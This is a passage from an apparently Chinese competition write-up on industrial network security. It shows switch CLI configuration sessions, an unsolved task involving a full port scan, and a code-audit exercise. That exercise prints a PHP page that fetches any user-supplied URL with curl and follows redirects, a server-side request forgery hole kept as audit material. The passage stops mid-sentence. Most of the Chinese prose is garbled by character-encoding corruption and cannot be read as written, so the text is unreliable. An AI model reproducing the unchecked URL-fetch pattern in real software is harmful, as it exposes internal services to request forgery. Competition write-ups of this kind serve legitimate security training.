class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é‚£ä¹ˆå°±æ˜¯è¦åœ¨configæ¨¡å¼ä¸‹å¯¹äº¤æ¢æœºè·¯ç”±è¿›è¡Œé…ç½®ï¼Œæµ‹è¯•å‘ç°<code>interface gigabitEthernet 1/0/2</code>è¿›å…¥ config-if æ¨¡å¼ä¸‹é…ä¸äº† ip åœ°å€</p><p>å…ˆçœ‹ä¸€ä¸‹ç°æœ‰çš„è·¯ç”±é…ç½®</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">TL-SG5210<span class="token comment">#show </span> aaa                  - Display the AAA configuration access-list          - Display ACL information arp                  - Display ARP information bandwidth            - Display bandwidth rate configuration boot                 - Display the boot configuration cable-diagnostics    - Display Cable diagnostics results cloud-server         - cloud-server  cluster              - Display cluster information cpu-utilization      - Display CPU utilization debugging            - Dispaly modules debug status dot1q-tunnel         - Display VLAN VPN configuration dot1x                - Display <span class="token number">802</span>.1x configuration information etherchannel         - Display EtherChannel information gvrp                 - Display GVRP information <span class="token function">history</span>              - Display <span class="token builtin class-name">command</span> <span class="token function">history</span> holiday              - Display holiday information image-info           - Display the image info interface            - Display interface status and configuration <span class="token function">ip</span>                   - Display IP information ipv6                 - Internet Protocol version <span class="token number">6</span> <span class="token punctuation">(</span>IPv6<span class="token punctuation">)</span> lacp                 - Display LACP configuration lldp                 - Display LLDP information logging              - Display log information loopback-detection   - Display loopback detection information mac                  - Display mac information mac-vlan             - Display MAC Based VLAN information memory-utilization   - Display memory utilization monitor              - Display monitor sessions information port                 - Display Ethernet port configuration protocol-vlan        - Display protocol VLAN configuration qos                  - Display QoS related information radius-server        - Show radius server information rmon                 - Display SNMP RMON information running-config       - Display running config snmp-server          - Display SNMP related information spanning-tree        - Display spanning tree information startup-config       - Display startup config storm-control        - Display interface's storm-control configuration system-info          - Display system information system-time          - Display current system <span class="token function">time</span> information tacacs-server        - Show tacacs+ server information telnet-status        - Display telnet status time-range           - Display <span class="token function">time</span> segment information ucl                  - Display UCL information user                 - Display user account information vlan                 - Display VLAN information voice                - Display voice VLAN configurationTL-SG5210<span class="token comment">#show ip interface </span> brief                - Brief summary of IP status and configuration fastEthernet         - FastEthernet IEEE <span class="token number">802.3</span> gigabitEthernet      - GigabitEthernet IEEE <span class="token number">802</span>.3z loopback             - Loopback interface port-channel         - Ethernet Channel of interfaces ten-gigabitEthernet  - Ten-GigabitEthernet IEEE <span class="token number">802</span>.3ae vlan                 - VLAN interface <span class="token operator">&lt;</span>cr<span class="token operator">></span>TL-SG5210<span class="token comment">#show ip interface brief </span> Interface             IP-Address          Method  Status  Protocol  Shutdown ---------             ----------          ------  ------  --------  -------- Vlan1                 <span class="token number">192.168</span>.0.1/24      Static  up      up        no<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>config æ¨¡å¼ä¸‹å¯ç”¨AAA</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">TL-SG5210<span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token comment">#aaa </span> accounting           - Configure accounting method list authentication       - Configure authentication method list <span class="token builtin class-name">enable</span>               - Enable AAA group                - Configure AAA groupTL-SG5210<span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token comment">#aaa enable</span>TL-SG5210<span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token comment">#exit</span>TL-SG5210<span class="token comment">#enable-admin</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ¥ä¸‹æ¥ç»“åˆè¿™å¼ è¡¨é…ç½® vlan</p><p><img src="/blog/2024/11/28/2024%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/image-20241203143852945.png" alt="image-20241203143852945"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">TL-SG5210<span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token comment">#interface </span> fastEthernet         - FastEthernet IEEE <span class="token number">802.3</span> gigabitEthernet      - GigabitEthernet IEEE <span class="token number">802</span>.3z loopback             - Loopback interface port-channel         - Ethernet Channel of interfaces range                - Interface Range Mode ten-gigabitEthernet  - Ten-GigabitEthernet IEEE <span class="token number">802</span>.3ae vlan                 - Interface VLAN ModeTL-SG5210<span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token comment">#interface vlan                                               </span> <span class="token operator">&lt;</span><span class="token number">1</span>-409<span class="token operator"><span class="token file-descriptor important">4</span>></span>             - VLAN interface number TL-SG5210<span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token comment">#interface vlan 4</span>TL-SG5210<span class="token punctuation">(</span>config-if<span class="token punctuation">)</span><span class="token comment">#</span> access-list          - Configure the access list control module arp                  - Address Resolution Protocol <span class="token punctuation">(</span>ARP<span class="token punctuation">)</span> description          - Specify vlan interface description <span class="token function">ip</span>                   - Configure interface internet protocol ipv6                 - IPv6 interface subcommands <span class="token function">shutdown</span>             - Shutdown the selected interface <span class="token function">clear</span>                - Reset functions end                  - Return to Privileged EXEC Mode <span class="token builtin class-name">exit</span>                 - Exit current mode no                   - Negate <span class="token builtin class-name">command</span> show                 - Display system information TL-SG5210<span class="token punctuation">(</span>config-if<span class="token punctuation">)</span><span class="token comment">#ip </span> address              - Set IP address manually address-alloc        - Set IP address by bootp or dhcp helper-address       - Specify a destination address <span class="token keyword">for</span> DHCP broadcasts local-proxy-arp      - Specify <span class="token builtin class-name">local</span> proxy ARP configuration proxy-arp            - Specify proxy ARP configuration rip                  - Specify RIP protocol interface configurationTL-SG5210<span class="token punctuation">(</span>config-if<span class="token punctuation">)</span><span class="token comment">#ip address</span>address             address-alloc       TL-SG5210<span class="token punctuation">(</span>config-if<span class="token punctuation">)</span><span class="token comment">#ip address 192.168.52.86 </span> A.B.C.D              - Specify the IP subnet maskTL-SG5210<span class="token punctuation">(</span>config-if<span class="token punctuation">)</span><span class="token comment">#ip address 192.168.52.86 255.255.255.0</span>TL-SG5210<span class="token punctuation">(</span>config-if<span class="token punctuation">)</span><span class="token comment">#no shutdown </span><span class="token function">shutdown</span>            <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™æ ·å°±é…ç½®å®Œæˆäº†ï¼Œç„¶åæŠŠç”µè„‘çš„ç½‘çº¿å¦ä¸€å¤´ä»hubä¸Šæ‹”ä¸‹æ¥æ¥åˆ°äº¤æ¢æœºçš„ lan å£ä¸Šå°±èƒ½pingé€šäº†</p><hr><h1 id="ä»»åŠ¡äºŒï¼šäº¤æ¢æœºé…ç½®ï¼ˆUnsolvedï¼‰"><a href="#ä»»åŠ¡äºŒï¼šäº¤æ¢æœºé…ç½®ï¼ˆUnsolvedï¼‰" class="headerlink" title="ä»»åŠ¡äºŒï¼šäº¤æ¢æœºé…ç½®ï¼ˆUnsolvedï¼‰"></a>ä»»åŠ¡äºŒï¼šäº¤æ¢æœºé…ç½®ï¼ˆUnsolvedï¼‰</h1><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">å¯¹ç«èµ›å¹³å°ä¸­çš„ç½‘ç»œè®¾å¤‡è¿›è¡Œé…ç½®ï¼Œå®Œæˆè¯¥ä»»åŠ¡åº”èƒ½å¤Ÿå®ç°ä»¥ä¸‹æ•ˆæœï¼š1. å·¥ä¸šé˜²ç«å¢™ã€å·¥ä¸šæ—¥å¿—å®¡è®¡çš„ç®¡ç†å£åŒå¤„äºäº¤æ¢æœº SW1 çš„ VLAN 5 ä¸‹ï¼Œæ“ä½œäººå‘˜å¯é€šè¿‡æ¡Œé¢ Hub è®¿é—® MES çš„ Web é¡µé¢ï¼Œé€šè¿‡ G1/0/3 è®¿é—®å·¥ä¸šæ—¥å¿—å®¡è®¡ç®¡ç†é¡µé¢ã€å·¥ä¸šé˜²ç«å¢™ç®¡ç†é¡µé¢ã€‚2. SCADAã€HMI åŒå¤„äº VLAN ä¸‹ï¼Œæ“ä½œäººå‘˜å¯é€šè¿‡ SCADA è®¿é—® MES çš„ web é¡µé¢ã€‚3. é€šè¿‡å·¥ä¸šæ—¥å¿—å®¡è®¡èƒ½å¤Ÿç›‘æ§æµç»äº¤æ¢æœº SW1 å’Œäº¤æ¢æœº SW2 çš„æ‰€æœ‰æµé‡æ•°æ®ã€‚4. å°†äº¤æ¢æœº 1 çš„ G1/0/8 çš„ IP åœ°å€é…ç½®ä¸º 12.0.N.254/24ã€‚5. æ·»åŠ é™æ€è·¯ç”± 171.16.0.0/16ï¼Œç½‘å…³ä¸º 12.0.N.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç›´æ¥æŠŠconsoleçº¿æ’åˆ°äº¤æ¢æœº1ä¸Šï¼Œç”¨åŒæ ·çš„æ–¹å¼é…ç½® vlan5ï¼Œä½¿å…¶èƒ½å¤Ÿé€šè¿‡ç½‘çº¿è®¿é—®å·¥ä¸šé˜²ç«å¢™ã€å·¥ä¸šæ—¥å¿—å®¡è®¡</p><p><img src="/blog/2024/11/28/2024%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/image-20241128150333714.png" alt="image-20241128150333714"></p><p><img src="/blog/2024/11/28/2024%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/image-20241128150413106.png" alt="image-20241128150413106"></p><p>ä½†æ˜¯è¿˜å·®ä¸€ä¸ª é€šè¿‡æ¡Œé¢ Hub è®¿é—® MES çš„ Web é¡µé¢</p><p>hintï¼šMESçš„webæœåŠ¡å¼€åœ¨ä¸å¸¸è§ç«¯å£</p><p>äºæ˜¯æŠŠ65535å…¨æ‰«äº†ä¸€éã€‚ã€‚ç„¶åæ²¡æ‰«åˆ°ï¼Œä¸çŸ¥é“æ€ä¹ˆæçš„</p><hr><h1 id="ä»»åŠ¡åä¸‰ï¼šä»£ç å®‰å…¨å®¡è®¡"><a href="#ä»»åŠ¡åä¸‰ï¼šä»£ç å®‰å…¨å®¡è®¡" class="headerlink" title="ä»»åŠ¡åä¸‰ï¼šä»£ç å®‰å…¨å®¡è®¡"></a>ä»»åŠ¡åä¸‰ï¼šä»£ç å®‰å…¨å®¡è®¡</h1><p>å¯¹ä»¥ä¸‹è¿™æ®µä»£ç è¿›è¡Œå®‰å…¨å®¡è®¡ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'POST'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_URL</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$error</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"æ— æ•ˆçš„ URLï¼Œè¯·æ£€æŸ¥æ ¼å¼ã€‚"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_FOLLOWLOCATION</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_MAXREDIRS</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$response</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$error</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'cURL é”™è¯¯: '</span> <span class="token operator">.</span> <span class="token function">curl_error</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>zh<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>å±åŒ–å“å¤„ç†ç³»ç»Ÿ<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">        <span class="token selector">body</span> <span class="token punctuation">&#123;</span>            <span class="token property">font-family</span><span class="token punctuation">:</span> Arial<span class="token punctuation">,</span> sans-serif<span class="token punctuation">;</span>            <span class="token property">background-color</span><span class="token punctuation">:</span> #f5f5f5<span class="token punctuation">;</span>            <span class="token property">margin</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>            <span class="token property">padding</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>            <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span>            <span class="token property">justify-content</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>            <span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>            <span class="token property">height</span><span class="token punctuation">:</span> 100vh<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">.container</span> <span class="token punctuation">&#123;</span>            <span class="token property">background-color</span><span class="token punctuation">:</span> white<span class="token punctuation">;</span>            <span class="token property">padding</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>            <span class="token property">border-radius</span><span class="token punctuation">:</span> 8px<span class="token punctuation">;</span>            <span class="token property">box-shadow</span><span class="token punctuation">:</span> 0 0 10px <span class="token function">rgba</span><span class="token punctuation">(</span>0<span class="token punctuation">,</span> 0<span class="token punctuation">,</span> 0<span class="token punctuation">,</span> 0.1<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token property">width</span><span class="token punctuation">:</span> 400px<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">h1</span> <span class="token punctuation">&#123;</span>            <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">label</span> <span class="token punctuation">&#123;</span>            <span class="token property">font-size</span><span class="token punctuation">:</span> 14px<span class="token punctuation">;</span>            <span class="token property">margin-bottom</span><span class="token punctuation">:</span> 8px<span class="token punctuation">;</span>            <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">input[type="text"]</span> <span class="token punctuation">&#123;</span>            <span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>            <span class="token property">padding</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>            <span class="token property">margin-bottom</span><span class="token punctuation">:</span> 15px<span class="token punctuation">;</span>            <span class="token property">border</span><span class="token punctuation">:</span> 1px solid #ccc<span class="token punctuation">;</span>            <span class="token property">border-radius</span><span class="token punctuation">:</span> 4px<span class="token punctuation">;</span>            <span class="token property">box-sizing</span><span class="token punctuation">:</span> border-box<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">.btn</span> <span class="token punctuation">&#123;</span>            <span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>            <span class="token property">padding</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>            <span class="token property">background-color</span><span class="token punctuation">:</span> #4CAF50<span class="token punctuation">;</span>            <span class="token property">color</span><span class="token punctuation">:</span> white<span class="token punctuation">;</span>            <span class="token property">border</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>            <span class="token property">border-radius</span><span class="token punctuation">:</span> 4px<span class="token punctuation">;</span>            <span class="token property">cursor</span><span class="token punctuation">:</span> pointer<span class="token punctuation">;</span>            <span class="token property">font-size</span><span class="token punctuation">:</span> 16px<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">.btn:hover</span> <span class="token punctuation">&#123;</span>            <span class="token property">background-color</span><span class="token punctuation">:</span> #45a049<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">.error</span> <span class="token punctuation">&#123;</span>            <span class="token property">color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span>            <span class="token property">font-size</span><span class="token punctuation">:</span> 14px<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">.result</span> <span class="token punctuation">&#123;</span>            <span class="token property">margin-top</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>            <span class="token property">background-color</span><span class="token punctuation">:</span> #f1f1f1<span class="token punctuation">;</span>            <span class="token property">padding</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>            <span class="token property">border-radius</span><span class="token punctuation">:</span> 4px<span class="token punctuation">;</span>            <span class="token property">word-wrap</span><span class="token punctuation">:</span> break-word<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>å±åŒ–å“å¤„ç†<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>è¯·è¾“å…¥ URLï¼š<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>è¯·è¾“å…¥æœ‰æ•ˆçš„ URL<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>æäº¤å¤„ç†<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>        <span class="token comment">&lt;!-- æ˜¾ç¤ºé”™è¯¯æ¶ˆæ¯ --></span>        <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token delimiter important">?></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>        <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">endif</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>    <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token delimiter important">?></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>result<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">></span></span>è¯·æ±‚ç»“æœ:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pre</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pre</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">endif</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p>æŒ‡å‡ºä»£ç å­˜åœ¨æ¼æ´çš„è¡Œæ•°ï¼šä¸€çœ¼åœ¨12è¡Œ<code>$response = 